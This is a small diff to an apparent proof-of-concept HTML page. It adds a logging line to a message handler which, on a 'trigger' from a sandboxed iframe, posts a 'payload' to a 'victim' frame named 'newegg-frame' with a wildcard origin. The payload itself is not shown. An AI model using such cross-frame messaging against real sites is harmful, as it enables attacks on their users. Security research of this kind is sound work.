@@ -18,6 +18,7 @@
        window.addEventListener("message", (event) => {
         if (event.data === "trigger") {
           // Sandboxed iframe asked us to send message to victim
+          console.log("sending payload");
           const victimFrame = document.getElementById("newegg-frame").contentWindow;
           victimFrame.postMessage(payload, "*");
         } else {
@@ -28,5 +29,6 @@
     </script>
   </body>
 </html>
+
 
 
